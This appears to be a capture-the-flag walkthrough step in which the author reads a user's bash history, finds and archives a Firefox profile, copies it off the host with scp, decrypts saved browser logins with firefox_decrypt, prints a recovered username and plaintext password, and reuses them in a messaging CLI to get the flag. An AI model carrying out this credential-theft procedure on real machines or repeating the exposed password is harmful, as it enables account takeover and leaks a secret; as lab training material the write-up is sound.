# Collection 2

1. Resume From [🗂 PC2](../13-PC2/)
2. Chek Bash History: `cat .bash_history`
```
...
notification-cli
...
```
3. Check [🗂 notification-cli](./02-notification-cli.py), Python Based WS Messenger!
4. Look for Mozilla Password Files
```
# find firefox every
find / -name firefox
```
5. firefox profile: `/home/rezaee/snap/firefox/common/.mozilla/firefox/s1r0klni.default/`
6. Compress with tar
```
cd ..
tar -zcvf profile.tar.gz ./s1r0klni.default/
```
7. Download With SCP
```
scp -P 7777 -i ~/.ssh/id_rsa2 rezaee@127.0.0.1:/home/rezaee/snap/firefox/common/.mozilla/firefox/profile.tar.gz ./07-profile.tar.gz
```
6. Download Firefox Decryptor:
```
wget https://github.com/unode/firefox_decrypt/blob/main/firefox_decrypt.py
```

7. Extract [🗂 Profile.tar.xz](./07-profile.tar.gz)

8. Run Extractor: `python 06-firefox_decrypt.py ./s1r0klni.default`
```
Website:   https://notification.petromaz.ir
Username: 'rezaee'
Password: '8QmzBKyXJXDM'
```
9. Send Message to `mansouri`
```
# Help
notification-cli -h

# Send Message
notification-cli rezaee 8QmzBKyXJXDM s "hello" mansouri

# Receive Message
notification-cli rezaee 8QmzBKyXJXDM r 20 mansouri
```
10. Flag in Response